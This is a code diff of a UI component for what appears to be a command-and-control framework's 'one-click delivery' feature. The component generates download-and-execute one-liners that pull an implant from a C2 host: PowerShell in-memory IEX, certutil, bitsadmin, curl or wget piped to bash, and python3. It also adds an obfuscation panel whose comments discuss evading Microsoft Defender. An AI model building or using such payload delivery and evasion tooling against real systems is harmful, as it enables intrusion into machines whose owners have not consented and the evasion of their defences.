@@ -1,4 +1,4 @@
-import { useEffect, useLayoutEffect, useMemo, useRef, useState } from 'react'
+import { useEffect, useMemo, useRef, useState } from 'react'
 import { useStore } from '../store'
 import { t } from '../i18n'
 import { AGENT_PROFILES, defaultAgentConfig } from '../api/listeners'
@@ -290,133 +290,135 @@ type AxfDone = { variants: string[]; issues: string[]; ms: number | null; err: s
  * 标签在左占 100px，在 280px 的右栏里等于直接砍掉四成宽度 ——
  * 命令框实测只有 140px 宽。
  */
-function CmdBlock({
-  label,
-  value,
-  onCopy,
-  warn,
+function shortProto(reg?: string): string {
+  const s = String(reg || '').trim()
+  if (!s) return '-'
+  return s.replace(/^(?:Beacon|Kharon|Gopher|Linux|Macos)/i, '') || s
+}
+
+function DeliveryEmblem() {
+  return (
+    <svg width="16" height="16" viewBox="0 0 16 16" fill="none" aria-hidden="true">
+      <circle cx="8" cy="8" r="2.1" fill="currentColor" />
+      <path d="M4.8 4.8a4.5 4.5 0 0 0 0 6.4M11.2 4.8a4.5 4.5 0 0 1 0 6.4" stroke="currentColor" strokeWidth="1.4" strokeLinecap="round" />
+      <path d="M2.6 2.6a7.6 7.6 0 0 0 0 10.8M13.4 2.6a7.6 7.6 0 0 1 0 10.8" stroke="currentColor" strokeWidth="1.3" strokeLinecap="round" opacity="0.65" />
+    </svg>
+  )
+}
+
+function renderHighlightedCmd(cmd: string) {
+  const tokRe = /(https?:\/\/[^\s'"]+|powershell|cmd(?=\s)|certutil|bitsadmin|curl|wget|python3|bash|%[A-Z0-9_]+%|-[A-Za-z0-9.-]+|\/(?:c|transfer|download|priority)\b)/gi
+  const parts: Array<{ text: string; kind: 'str' | 'cmd' | 'url' | 'flag' | 'var' }> = []
+  let last = 0
+  let m: RegExpExecArray | null
+  while ((m = tokRe.exec(cmd)) !== null) {
+    if (m.index > last) {
+      parts.push({ text: cmd.slice(last, m.index), kind: 'str' })
+    }
+    const val = m[0]
+    const low = val.toLowerCase()
+    const kind = low.startsWith('http://') || low.startsWith('https://')
+      ? 'url'
+      : val.startsWith('%') && val.endsWith('%')
+        ? 'var'
+        : val.startsWith('-') || val.startsWith('/')
+          ? 'flag'
+          : 'cmd'
+    parts.push({ text: val, kind })
+    last = m.index + val.length
+  }
+  if (last < cmd.length) {
+    parts.push({ text: cmd.slice(last), kind: 'str' })
+  }
+  return parts.map((p, i) => (
+    p.kind === 'str'
+      ? <span key={i}>{p.text}</span>
+      : <span key={i} className={`st-tok-${p.kind}`}>{p.text}</span>
+  ))
+}
+
+function AxfVariantsBox({
   axf,
 }: {
-  label: string
-  value: string
-  onCopy: () => void
-  /** 与混淆无关的工具限制，常驻显示 */
-  warn?: string
-  axf?: {
+  axf: {
     landing: 'cmd' | 'ps'
     state?: 'loading' | AxfDone
     disabled: boolean
     disabledReason: string
     onRun: () => void
     onCopyVariant: (v: string, i: number) => void
-    /** 变体在界面上显示的形态 = 复制出去的内容（cmd 落点要把 post + tail 接回去） */
     finalText: (v: string) => string
   }
 }) {
-  const ref = useRef<HTMLTextAreaElement>(null)
+  const [variantsOpen, setVariantsOpen] = useState(true)
+  const axfRef = useRef<HTMLDivElement>(null)
 
-  // 盒子高度跟着内容走：命令折成几行，框就几行高。
-  //
-  // 两处不能省：
-  // 1. 先归零 —— 否则换一条更短的命令时 scrollHeight 只会往下缩，而 height
-  //    已经是旧的大值，框会停在上一条命令的高度上。
-  // 2. 补上边框 —— scrollHeight 是"内容 + 内边距"，不含边框；而 .wd-cmd 是
-  //    `box-sizing: border-box` + 上下各 1px 边框，所以 height 会被边框先吃掉
-  //    2px，内容区永远差 2px，最后一行贴着 overflow: hidden 被切掉。
-  //    offsetHeight - clientHeight 正好就是那圈边框，写成减法而不是写死 2，
-  //    以后改边框宽度也不会悄悄退回原样。
-  useLayoutEffect(() => {
-    const el = ref.current
-    if (!el) return
-    el.style.height = 'auto'
-    el.style.height = `${el.scrollHeight + el.offsetHeight - el.clientHeight}px`
-  }, [value])
+  const loading = axf.state === 'loading'
+  const done = axf.state && axf.state !== 'loading' ? axf.state : null
+  const prevBusy = useRef(false)
+  useEffect(() => {
+    if (prevBusy.current && done) {
+      setVariantsOpen(true)
+      requestAnimationFrame(() => axfRef.current?.scrollIntoView({ behavior: 'smooth', block: 'nearest' }))
+    }
+    prevBusy.current = !!loading
+  }, [loading, done])
 
-  const loading = axf?.state === 'loading'
-  const done = axf && axf.state && axf.state !== 'loading' ? axf.state : null
-
+  if (!done) return null
   return (
-    <div className="field field-flat wd-block">
-      <div className="wd-block-hd">
-        <label>{label}</label>
-        <div className="wd-acts">
-          {axf && (
+    <div className="ax-axf-box" ref={axfRef}>
+      {done.err ? (
+        <div className="ax-warn-callout" style={{ margin: 0 }}>{done.err}</div>
+      ) : done.variants.length === 0 ? (
+        <div className="ax-warn-callout" style={{ margin: 0 }}>{t('服务端没有返回任何变体')}</div>
+      ) : (
+        <>
+          <div className="ax-axf-hd">
+            <span>
+              ArgFuscator · {done.variants.length} 个变体
+              {done.issues.some(Boolean)
+                ? ` · ${done.issues.filter(Boolean).length} 个已标注风险`
+                : ' · 逐条校验通过'}
+              {done.ms !== null ? ` · ${done.ms} ms` : ''}
+            </span>
             <button
-              className="ghost wd-copy"
-              disabled={loading || axf.disabled}
-              title={axf.disabled ? axf.disabledReason : '生成语义等价、字面不同的变体'}
-              onClick={axf.onRun}
+              type="button"
+              className="ax-btn-ghost ax-btn-sm"
+              onClick={() => setVariantsOpen((v) => !v)}
             >
-              {loading ? '混淆中…' : t('参数混淆')}
+              {variantsOpen ? '收起变体' : `展开变体 (${done.variants.length})`}
             </button>
-          )}
-          <button className="ghost wd-copy" onClick={onCopy}>{t('复制')}</button>
-        </div>
-      </div>
-      <textarea ref={ref} className="wd-cmd mono" readOnly rows={1} value={value} />
-
-      {/* 常驻警告：与混淆无关的工具限制（如 certutil 过不了自签证书）。
-          挂在这里而不是混淆结果里 —— 它是这条命令固有的，不是「生成之后才知道」的。 */}
-      {warn && <div className="hint warn-hint wd-warn">{warn}</div>}
-
-      {axf && done && (
-        <div className="wd-axf">
-          {done.err ? (
-            <div className="hint warn-hint">{done.err}</div>
-          ) : done.variants.length === 0 ? (
-            <div className="hint warn-hint">{t('服务端没有返回任何变体')}</div>
-          ) : (
+          </div>
+          {variantsOpen && (
             <>
-              <div className="wd-axf-hd">
-                <span className="dim">
-                  {done.variants.length} 个变体
-                  {done.issues.some(Boolean)
-                    ? ` · ${done.issues.filter(Boolean).length} 个已标注风险`
-                    : ' · 逐条校验通过'}
-                  {done.ms !== null ? ` · ${done.ms} ms` : ''}
-                </span>
-              </div>
-              {/* 标注而不是丢弃：坏变体照发（插件对上游返回值零校验），
-                  但替操作员扔掉也不对 —— 那样他就看不见风险长什么样。 */}
               {done.issues.some(Boolean) && (
-                <div className="hint muted-hint">
-                  标红的是语义被改坏的变体：混淆器偶尔会改掉 URL 里的路径段
-                  （实测把 <code>deliver</code> {t('写成')} <code>delivebr</code>），命令照样跑、
-                  只是下不到东西 —— 这类坏法比语法错更难发现，所以逐条比对
-                  归一化后的 URL。带标注的那几条别用。
+                <div className="ax-warn-callout" style={{ margin: 0 }}>
+                  标红变体可能被改坏 URL 路径段，请勿直接复制标红变体。
                 </div>
               )}
-              {axf.landing === 'ps' && (
-                <div className="hint muted-hint">
-                  {t('This one is a full PowerShell command: paste variants into')} <b>PowerShell / Win+R</b> {t('to run.')}.
-                  ⚠ PS 这一族的混淆收益本轮**没测出来**（明文集与混淆集都没被 Defender 拦），
-                  别当成已证。
-                </div>
-              )}
-              <div className="axf-list">
+              <div className="ax-axf-list">
                 {done.variants.map((v, i) => (
-                  <div className={`axf-item${done.issues[i] ? ' axf-item-bad' : ''}`} key={i}>
-                    <div className="axf-item-hd">
-                      <span className="axf-n">#{i + 1}</span>
-                      {done.issues[i] && <span className="axf-badge">{t('有风险')}</span>}
-                      <span className="spacer" />
-                      <button className="ghost" onClick={() => axf.onCopyVariant(v, i)}>{t('复制')}</button>
+                  <div className={`ax-axf-item ${done.issues[i] ? 'bad' : ''}`} key={i}>
+                    <div className="ax-axf-item-hd">
+                      <span className="mono">#{i + 1}</span>
+                      {done.issues[i] && <span className="ax-pill warn" style={{ height: 18 }}>{t('有风险')}</span>}
+                      <span style={{ flex: 1 }} />
+                      <button type="button" className="ax-btn ax-btn-sm" onClick={() => axf.onCopyVariant(v, i)}>{t('复制')}</button>
                     </div>
-                    {done.issues[i] && <div className="hint warn-hint">{done.issues[i]}</div>}
-                    {/* pre-wrap：变体里会出现同形字与 U+2013，折行但不省略 —— 要复制的是完整命令 */}
-                    <pre className="axf-cmd">{axf.finalText(v)}</pre>
+                    {done.issues[i] && <div className="ax-warn-callout" style={{ margin: 0 }}>{done.issues[i]}</div>}
+                    <pre className="ax-axf-cmd mono">{renderHighlightedCmd(axf.finalText(v))}</pre>
                   </div>
                 ))}
               </div>
             </>
           )}
-        </div>
+        </>
       )}
     </div>
   )
 }
 
-export function WebDelivery() {
+export function WebDelivery({ onClose }: { onClose?: () => void } = {}) {
   const listeners = useStore((s) => s.listeners) || {}
   const api = useStore((s) => s.api)
   const pushLog = useStore((s) => s.pushLog)
@@ -440,6 +442,26 @@ export function WebDelivery() {
   const [loaded, setLoaded] = useState(false)
   const [pluginMissing, setPluginMissing] = useState(false)
   const [statusText, setStatusText] = useState('拉取服务端状态…')
+  const [methodOs, setMethodOs] = useState<'win' | 'unix'>('win')
+  const [winMethod, setWinMethod] = useState<'ps' | 'certutil' | 'bitsadmin' | 'curl'>('ps')
+  const [psVariant, setPsVariant] = useState<'ps-cmd' | 'ps-native' | 'ps-iwr'>('ps-cmd')
+  const [unixMethod, setUnixMethod] = useState<'lin-curl' | 'lin-wget' | 'lin-direct' | 'lin-py'>('lin-curl')
+  const [copiedKey, setCopiedKey] = useState('')
+  const [showTechNotes, setShowTechNotes] = useState(false)
+  const [serverSnap, setServerSnap] = useState<{
+    scriptRoute: string
+    payloadRoute: string
+    listener: string
+    agentName: string
+    format: string
+    arch: string
+    sleep: string
+    jitter: number
+    cacheTtl: number
+    c2Host: string
+    cacheEntries: number
+  } | null>(null)
+  const copyTimer = useRef<number | null>(null)
   // 每拉到一份服务端配置就 +1。它只有一个用途：让上面那个归一化 effect 再跑一次
   // （服务端快照里的值可能和当前 agent 不匹配，见那个 effect 的注释）。
   const [serverSeq, setServerSeq] = useState(0)
@@ -565,28 +587,35 @@ export function WebDelivery() {
   }
 
   function applyStatus(st: Status) {
+    const legacy: Record<string, string> = {
+      'Artifact Go Exe': st.agent_name === 'gopher' ? 'Binary EXE' : 'Exe',
+      'Artifact C++ Exe': 'Exe',
+      'Artifact C++ DLL': 'DLL',
+    }
+    const fmt = st.format ? (legacy[st.format] || st.format) : ''
     if (st.script_route) setScriptRoute(st.script_route)
     if (st.payload_route) setPayloadRoute(st.payload_route)
     if (st.agent_name) setAgentName(st.agent_name)
-    if (st.format) {
-      // 兼容服务端历史默认值（已废弃的 Artifact 系列）
-      const legacy: Record<string, string> = {
-        'Artifact Go Exe': st.agent_name === 'gopher' ? 'Binary EXE' : 'Exe',
-        'Artifact C++ Exe': 'Exe',
-        'Artifact C++ DLL': 'DLL',
-      }
-      setFormat(legacy[st.format] || st.format)
-    }
+    if (fmt) setFormat(fmt)
     if (st.listener) setListener(st.listener)
     if (st.c2_host_url) setC2Host(st.c2_host_url)
-    // 服务端存的 sleep 可能与即将生效的 agent 不同类（历史值：linux 下存着 beacon 的
-    // "5s"）。这里照旧原样采纳，交给下面那个依赖 serverSeq 的归一化 effect 统一校正 ——
-    // 校正规则只留一份，别在这儿再写一遍。
     if (st.sleep) setSleep(st.sleep)
     if (typeof st.jitter === 'number') setJitter(st.jitter)
     if (typeof st.cache_ttl_min === 'number') setCacheTtl(st.cache_ttl_min)
     if (typeof st.arch === 'string') setArch(st.arch || '')
-    // 通知归一化 effect：来了一份新快照
+    setServerSnap({
+      scriptRoute: st.script_route || scriptRoute,
+      payloadRoute: st.payload_route || payloadRoute,
+      listener: st.listener || listener,
+      agentName: st.agent_name || agentName,
+      format: fmt || format,
+      arch: typeof st.arch === 'string' ? st.arch : arch,
+      sleep: st.sleep || sleep,
+      jitter: typeof st.jitter === 'number' ? st.jitter : jitter,
+      cacheTtl: typeof st.cache_ttl_min === 'number' ? st.cache_ttl_min : cacheTtl,
+      c2Host: st.c2_host_url || c2Host,
+      cacheEntries: st.cache_entries ?? 0,
+    })
     setServerSeq((n) => n + 1)
   }
 
@@ -699,8 +728,7 @@ export function WebDelivery() {
         post: ` ${u}`,
         tail: `&& start /b "" ${u}`,
         landing: 'cmd',
-        // 与混淆无关：certutil 没有「跳过证书校验」开关，实测明文就失败
-        warn: 'certutil cannot skip cert validation — it always fails against a self-signed teamserver (0x80072F8F). Only usable with a trusted cert.',
+        warn: 'certutil 无法跳过自签证书校验（0x80072F8F），仅适用于已受信任的 HTTPS 证书。',
       },
       {
         id: 'bitsadmin',
@@ -710,7 +738,7 @@ export function WebDelivery() {
         post: ` ${b}`,
         tail: `& start /b "" ${b}`,
         landing: 'cmd',
-        warn: t('bitsadmin likewise cannot skip cert validation (0x80072F0D). Only usable with a trusted cert.'),
+        warn: 'bitsadmin 同样无法跳过自签证书校验（0x80072F0D），仅适用于受信任证书。',
       },
       {
         id: 'curl',
@@ -794,9 +822,20 @@ export function WebDelivery() {
     }
   }
 
-  async function copy(text: string, label: string) {
+  async function copy(text: string, label: string, key = '') {
     const ok = await copyText(text)
+    if (ok && key) {
+      setCopiedKey(key)
+      if (copyTimer.current) window.clearTimeout(copyTimer.current)
+      copyTimer.current = window.setTimeout(() => setCopiedKey(''), 1500)
+    }
     pushToast(ok ? 'ok' : 'err', ok ? `已复制${label}` : t('复制失败'))
+  }
+
+  function jumpTo(id: 'generate' | 'listeners' | 'sessions') {
+    if (id !== 'generate') onClose?.()
+    setTab(id)
+    openUiTab(id)
   }
 
   /**
@@ -857,280 +896,478 @@ export function WebDelivery() {
   }
 
   const selectedListener = compatible.find((l) => l.l_name === listener) || listenerList.find((l) => l.l_name === listener)
+  const showWin = agentName === 'beacon' || agentName === 'gopher' || agentName === 'kharon'
+  const showUnix = agentName === 'linux' || agentName === 'macos' || agentName === 'gopher'
+  void selectedListener
+
+  const isDirty = !!serverSnap && (
+    scriptRoute.trim() !== serverSnap.scriptRoute ||
+    payloadRoute.trim() !== serverSnap.payloadRoute ||
+    listener !== serverSnap.listener ||
+    agentName !== serverSnap.agentName ||
+    format !== serverSnap.format ||
+    arch !== serverSnap.arch ||
+    sleep !== serverSnap.sleep ||
+    Number(jitter) !== serverSnap.jitter ||
+    Number(cacheTtl) !== serverSnap.cacheTtl ||
+    c2Host.trim() !== serverSnap.c2Host
+  )
+
+  const effectiveOs: 'win' | 'unix' = showWin && !showUnix
+    ? 'win'
+    : !showWin && showUnix
+      ? 'unix'
+      : methodOs
+
+  const winMethods = useMemo(() => [
+    { id: 'ps' as const, prompt: 'PS>', promptCls: 'ax-prompt-ps', title: 'PowerShell 无文件', sub: '内存 IEX · 推荐', tag: '无文件' },
+    { id: 'certutil' as const, prompt: 'CMD>', promptCls: 'ax-prompt-cmd', title: 'certutil 直拉 EXE', sub: 'CMD 下载落地运行', tag: '直拉' },
+    { id: 'bitsadmin' as const, prompt: 'CMD>', promptCls: 'ax-prompt-cmd', title: 'bitsadmin 直拉 EXE', sub: '后台任务拉取执行', tag: '直拉' },
+    { id: 'curl' as const, prompt: 'CMD>', promptCls: 'ax-prompt-cmd', title: 'curl.exe 直拉 EXE', sub: 'Win10+ 内置客户端', tag: '直拉' },
+  ], [])
+
+  const unixMethods = useMemo(() => [
+    { id: 'lin-curl' as const, prompt: '$', promptCls: 'ax-prompt-sh', title: 'curl | bash', sub: '管道流式执行 · 推荐', tag: '推荐', value: linuxCmd, copyLabel: ' curl|bash' },
+    { id: 'lin-wget' as const, prompt: '$', promptCls: 'ax-prompt-sh', title: 'wget | bash', sub: 'Wget 管道执行', tag: 'WGET', value: linuxWget, copyLabel: ' wget|bash' },
+    { id: 'lin-direct' as const, prompt: '$', promptCls: 'ax-prompt-sh', title: 'curl 直拉二进制', sub: '落地加权运行后清理', tag: '直拉', value: linuxCurlDirect, copyLabel: ' curl pull' },
+    { id: 'lin-py' as const, prompt: 'PY>', promptCls: 'ax-prompt-py', title: 'python3 直拉', sub: 'Python 标准库拉取', tag: 'PY3', value: linuxPython, copyLabel: ' python3' },
+  ], [linuxCmd, linuxWget, linuxCurlDirect, linuxPython])
+
+  const activeWinEntry = useMemo(() => {
+    const id = winMethod === 'ps' ? psVariant : winMethod
+    return winEntries.find((e) => e.id === id) || winEntries[0]
+  }, [winMethod, psVariant, winEntries])
+
+  const activeUnixItem = useMemo(
+    () => unixMethods.find((m) => m.id === unixMethod) || unixMethods[0],
+    [unixMethods, unixMethod],
+  )
+
+  const activeHero = useMemo(() => {
+    if (effectiveOs === 'win' && activeWinEntry) {
+      return {
+        id: activeWinEntry.id,
+        prompt: activeWinEntry.landing === 'ps' ? 'PS>' : 'CMD>',
+        promptCls: activeWinEntry.landing === 'ps' ? 'ax-prompt-ps' : 'ax-prompt-cmd',
+        title: activeWinEntry.landing === 'ps' ? 'PowerShell 无文件加载' : activeWinEntry.label,
+        cmd: entryCommand(activeWinEntry),
+        copySuffix: ' ' + activeWinEntry.short,
+        warn: activeWinEntry.warn,
+        axf: axfFor(activeWinEntry),
+      }
+    }
+    return {
+      id: activeUnixItem.id,
+      prompt: activeUnixItem.prompt,
+      promptCls: activeUnixItem.promptCls,
+      title: activeUnixItem.title,
+      cmd: activeUnixItem.value,
+      copySuffix: activeUnixItem.copyLabel,
+      warn: undefined,
+      axf: undefined,
+    }
+  }, [effectiveOs, activeWinEntry, activeUnixItem, axfMeta, axfState])
+
+  const shortAgentLabel = (ag: string) => (
+    ag === 'beacon' ? 'Beacon'
+      : ag === 'kharon' ? 'Kharon'
+        : ag === 'linux' ? 'Linux'
+          : ag === 'macos' ? 'macOS'
+            : 'Gopher'
+  )
 
   return (
-    <div className="gen-page">
-      <div className="gen-layout">
-        <div className="gen-main card">
-          <div className="card-hd">
-            <h3>{t('Web 投递 · 一键上线')}</h3>
-            <span className="spacer" />
-            <span className="dim" style={{ fontSize: 12 }}>{t('多 Agent：Beacon / Gopher / Linux')}</span>
-            <PageTips id="delivery">
-              <p>{t('一键上线：为每个监听器生成 curl / wget / python3 单行命令，目标机执行即回连。')}</p>
-              <p>{t('目标机必须能')}<b>{t('直连')}</b>{t('此处的 C2 地址（公网地址）。')}</p>
-              <p>{t('插件未加载时页面会提示；修改配置后需重新生成命令。')}</p>
-            </PageTips>
+    <div className="ax-studio ax-wd">
+      <header className="ax-header">
+        <div className="ax-header-left">
+          <span className="ax-emblem">
+            <DeliveryEmblem />
+          </span>
+          <div className="ax-hd-titles">
+            <h2 className="ax-title">{t('一键投递')}</h2>
+            <span className="ax-sub mono">
+              {shortAgentLabel(agentName)} · {listener || t('待选监听')} · {format} · {arch || 'auto'}
+            </span>
           </div>
-          <div className="card-bd gen-body">
+          <span
+            className={`ax-pill ${
+              pluginMissing ? 'warn' : isDirty ? 'dirty' : loaded ? 'ok' : ''
+            }`}
+          >
+            <i className="dot" />
+            <span>
+              {pluginMissing
+                ? '插件未加载'
+                : isDirty
+                  ? '有未同步修改 · 请点击应用'
+                  : loaded
+                    ? `已同步 · 缓存 ${serverSnap?.cacheEntries ?? 0} 条`
+                    : '连接中'}
+            </span>
+          </span>
+        </div>
+
+        <div className="ax-header-right">
+          <button type="button" className="ax-btn" onClick={() => jumpTo('generate')}>
+            ← {t('生成载荷')}
+          </button>
+          <button type="button" className="ax-btn" disabled={busy} onClick={() => loadStatus()}>
+            {t('刷新状态')}
+          </button>
+          <PageTips id="delivery">
+            <p>{t('一键上线：为每个监听器生成单行命令，目标机执行即回连。')}</p>
+            <p>{t('目标机必须能')}<b>{t('直连')}</b>{t('此处的 C2 地址。')}</p>
+            <p>{t('修改路由、Agent 或构建参数后，需点击底部「应用并同步配置」生效。')}</p>
+          </PageTips>
+          {onClose && (
+            <button type="button" className="ax-close-btn" title="关闭窗口 (Esc)" onClick={onClose}>
+              ×
+            </button>
+          )}
+        </div>
+      </header>
+
+      <div className="ax-wd-body">
+        <aside className="ax-sidebar">
+          <div className="ax-side-scroll">
             {pluginMissing && (
-              <div className="hint warn-hint" style={{ marginBottom: 12 }}>
-                服务端未加载 <b>webdelivery</b> {t('插件（')}<code>dist/extenders/webdelivery/</code>）。
-                确认 profile 已启用该 service，并已编译 so 后从 dist 重启 teamserver。
+              <div className="ax-callout warn">
+                <span>服务端未加载 <b>webdelivery</b> 插件。</span>
               </div>
             )}
 
-            {/* 原来这里写的是"按监听自动选 Agent：…"，那描述的是已经删掉的反推逻辑。
-                真实方向是反的，照原样留着会让操作员以为点了监听能换 agent。 */}
-            <div className="hint muted-hint" style={{ marginBottom: 10 }}>
-              {t('Pick an')} <b>Agent</b>{t(' first — listeners below are filtered for compatibility. One listener can serve multiple agents:')}
-              GopherTCP 同时可配 gopher / Linux Agent / macOS Agent，BeaconWS 可配 beacon / Linux Agent。
-            </div>
-
-            <div className="gen-section-title">{t('1. 投递路由')}</div>
-            <div className="field-grid-2">
-              <div className="field">
-                <label>{t('Script 路由')}</label>
-                <input value={scriptRoute} onChange={(e) => setScriptRoute(e.target.value)} placeholder="/deliver" />
+            <section className="ax-side-sec">
+              <div className="ax-sec-hd">
+                <span>目标 Agent 与兼容监听器</span>
+                <span className="mono">{compatible.length} 可用</span>
               </div>
-              <div className="field">
-                <label>{t('Payload 路由')}</label>
-                <input value={payloadRoute} onChange={(e) => setPayloadRoute(e.target.value)} placeholder="/deliver/payload" />
-              </div>
-            </div>
-            <div className="field">
-              <label>{t('C2 Host URL（目标机访问的 teamserver，含 /api）')}</label>
-              <input
-                value={c2Host}
-                onChange={(e) => setC2Host(e.target.value)}
-                placeholder={t('https://<teamserver 地址>:<端口>/api')}
-              />
-              <div className="dim" style={{ fontSize: 11, marginTop: 4 }}>
-                {t('one-liner built with:')}<code className="mono">{scriptUrl || '…'}</code>
-              </div>
-            </div>
-
-            <div className="gen-section-title">{t('2. Agent / 监听器')}</div>
-            <div className="field">
-              <label>Agent</label>
-              <div className="chip-row">
+              <div className="ax-seg-track grid-5">
                 {AGENT_PROFILES.map((p) => (
                   <button
                     key={p.agent}
                     type="button"
-                    className={agentName === p.agent ? 'primary' : ''}
+                    className={`ax-seg-btn ${agentName === p.agent ? 'active' : ''}`}
+                    title={p.label}
                     onClick={() => {
                       setAgentName(p.agent)
+                      if (p.agent === 'linux' || p.agent === 'macos') setMethodOs('unix')
+                      else if (p.agent === 'beacon' || p.agent === 'kharon') setMethodOs('win')
                       if (p.agent === 'beacon') setFormat('Exe')
                       else if (p.agent === 'gopher') setFormat('Binary EXE')
                       else setFormat(p.formats.find((f) => f.includes('ELF')) || p.formats[0])
                       setArch('')
                     }}
                   >
-                    {p.label}
+                    {shortAgentLabel(p.agent)}
                   </button>
                 ))}
               </div>
-            </div>
 
-            {compatible.length === 0 ? (
-              <div className="hint warn-hint">
-                t('没有兼容监听器（需要') {profile.listeners.join(' / ')}）
-                <button className="ghost" style={{ marginLeft: 8 }} onClick={() => { setTab('listeners'); openUiTab('listeners') }}>
-                  去创建
-                </button>
-              </div>
-            ) : (
-              <div className="gen-listener-list">
-                {compatible.map((l) => (
-                  <button
-                    key={l.l_name}
-                    type="button"
-                    className={`gen-listener ${listener === l.l_name ? 'active' : ''}`}
-                    onClick={() => setListener(l.l_name)}
-                  >
-                    <span className={`tag ${String(l.l_status).toLowerCase().includes('listen') ? 'listen' : 'offline'}`}>
-                      {l.l_status || '-'}
-                    </span>
-                    <div className="meta">
-                      <div className="name mono">{l.l_name}</div>
-                      <div className="sub">{l.l_reg_name || '-'} · {l.l_bind_host || '-'}:{l.l_bind_port || '-'}</div>
-                    </div>
+              {compatible.length === 0 ? (
+                <div className="ax-callout warn">
+                  <span>暂无兼容 {profile.label} 的监听器</span>
+                  <button type="button" className="ax-btn ax-btn-sm" onClick={() => jumpTo('listeners')}>
+                    去创建 →
                   </button>
-                ))}
-              </div>
-            )}
-
-            <div className="gen-section-title">{t('3. 生成参数')}</div>
-            <div className="gen-params">
-              <div className="field">
-                <label>{t('格式')}</label>
-                <div className="chip-row">
-                  {formats.map((f) => (
-                    <button key={f} type="button" className={format === f ? 'primary' : ''} onClick={() => setFormat(f)}>
-                      {f}
-                    </button>
-                  ))}
                 </div>
-                {agentName === 'beacon' && format === 'Stager' && (
-                  <div className="hint muted-hint" style={{ marginTop: 6 }}>
-                    {t('Stager: the small loader fetches from the payload route. Prefer')} <b>Exe</b> {t('for daily one-liners.')}.
+              ) : (
+                <div className="ax-wd-lis-list">
+                  {compatible.map((l) => {
+                    const live = String(l.l_status).toLowerCase().includes('listen')
+                    return (
+                      <button
+                        key={l.l_name}
+                        type="button"
+                        className={`ax-lis-row ${listener === l.l_name ? 'active' : ''}`}
+                        onClick={() => setListener(l.l_name)}
+                      >
+                        <span className={`ax-lis-dot ${live ? 'on' : ''}`} />
+                        <div className="ax-lis-meta">
+                          <b className="mono">{l.l_name}</b>
+                          <span className="mono">{l.l_bind_host || '0.0.0.0'}:{l.l_bind_port || '-'} · {l.l_status || '-'}</span>
+                        </div>
+                        <span className="ax-proto-chip mono">{shortProto(l.l_reg_name)}</span>
+                      </button>
+                    )
+                  })}
+                </div>
+              )}
+            </section>
+
+            <section className="ax-side-sec">
+              <div className="ax-sec-hd">
+                <span>投递方式</span>
+                {showWin && showUnix ? (
+                  <div className="ax-seg-track" style={{ padding: 2 }}>
+                    <button
+                      type="button"
+                      className={`ax-seg-btn ${methodOs === 'win' ? 'active' : ''}`}
+                      style={{ height: '19px', padding: '0 6px', fontSize: '10px' }}
+                      onClick={() => setMethodOs('win')}
+                    >
+                      Windows
+                    </button>
+                    <button
+                      type="button"
+                      className={`ax-seg-btn ${methodOs === 'unix' ? 'active' : ''}`}
+                      style={{ height: '19px', padding: '0 6px', fontSize: '10px' }}
+                      onClick={() => setMethodOs('unix')}
+                    >
+                      Unix
+                    </button>
                   </div>
+                ) : (
+                  <span className="mono">{effectiveOs === 'win' ? 'Windows' : 'Linux / macOS'}</span>
                 )}
               </div>
-              <div className="field">
-                <label>{t('架构（空=按 UA auto）')}</label>
-                <div className="chip-row">
-                  <button type="button" className={!arch ? 'primary' : ''} onClick={() => setArch('')}>{t('自动')}</button>
-                  {arches.map((a) => (
-                    <button key={a} type="button" className={arch === a ? 'primary' : ''} onClick={() => setArch(a)}>{a}</button>
-                  ))}
-                </div>
+
+              <div className="ax-method-list">
+                {effectiveOs === 'win'
+                  ? winMethods.map((m) => (
+                      <button
+                        key={m.id}
+                        type="button"
+                        className={`ax-method-row ${winMethod === m.id ? 'active' : ''}`}
+                        onClick={() => setWinMethod(m.id)}
+                      >
+                        <span className={`ax-prompt-badge ${m.promptCls} mono`}>{m.prompt}</span>
+                        <div className="ax-method-meta">
+                          <b>{m.title}</b>
+                          <span>{m.sub}</span>
+                        </div>
+                        <span className="ax-plat-tag">{m.tag}</span>
+                      </button>
+                    ))
+                  : unixMethods.map((m) => (
+                      <button
+                        key={m.id}
+                        type="button"
+                        className={`ax-method-row ${unixMethod === m.id ? 'active' : ''}`}
+                        onClick={() => setUnixMethod(m.id)}
+                      >
+                        <span className={`ax-prompt-badge ${m.promptCls} mono`}>{m.prompt}</span>
+                        <div className="ax-method-meta">
+                          <b>{m.title}</b>
+                          <span>{m.sub}</span>
+                        </div>
+                        <span className="ax-plat-tag">{m.tag}</span>
+                      </button>
+                    ))}
               </div>
-              {/* 这一段原来只对 beacon/gopher/linux 渲染，macos 和 kharon 什么都没有 ——
-                  但 defaultAgentConfig 里 linux/macos/gopher 都有 reconn_timeout，
-                  beacon/kharon 都有 sleep + jitter。原来那三个是随手写的集合，
-                  漏掉的两个 agent 就等于在投递页设不了自己的参数。
-                  现在五个 agent 都渲染，呈现什么由 sleepKind 决定（见上面的推导）。
-
-                  标签也不写死了。linux/gopher 那栏原来写的是
-                  "Reconnect timeout / count 相关" —— 它承诺两个旋钮（timeout 和 count），
-                  而这一格绑的只有一个 sleep，count 根本没有对应的字段可发。 */}
-              <div className="field">
-                <label>{sleepSpec.kind === 'sleep' ? 'Sleep / Jitter' : t('重连间隔（秒）')}</label>
-                <div style={{ display: 'flex', gap: 8 }}>
-                  <input
-                    style={{ flex: 1 }}
-                    value={sleep}
-                    onChange={(e) => setSleep(e.target.value)}
-                    placeholder={sleepSpec.def}
-                  />
-                  {sleepSpec.kind === 'sleep' && (
-                    <input
-                      type="number"
-                      min={0}
-                      max={100}
-                      style={{ width: 90 }}
-                      value={jitter}
-                      onChange={(e) => setJitter(Number(e.target.value))}
-                      title={t('抖动%')}
-                    />
-                  )}
-                </div>
-              </div>
-              <div className="field">
-                <label>{t('缓存 TTL（分钟，0=不缓存）')}</label>
-                <input
-                  type="number"
-                  min={0}
-                  max={1440}
-                  value={cacheTtl}
-                  onChange={(e) => setCacheTtl(Number(e.target.value))}
-                />
-              </div>
-            </div>
-
-            <div className="btns" style={{ marginTop: 12 }}>
-              <button className="primary" style={{ minWidth: 140 }} disabled={busy || !listener} onClick={onApply}>
-                {busy ? '同步中…' : t('应用并同步')}
-              </button>
-              <button disabled={busy} onClick={() => loadStatus()}>{t('刷新状态')}</button>
-            </div>
-
-            {/* 这里原来还追加了「· {选中监听的 reg_name}」和「· 缓存 N」两截 ——
-                前者是本页表单的**当前值**（服务端那份在上面的 statusText 里已经报过），
-                后者和 statusText 里的「缓存 N 条」是同一个数。一行里混两种来源、
-                同一个数数两遍，读的人没法判断哪半截代表"服务端现在是什么"。
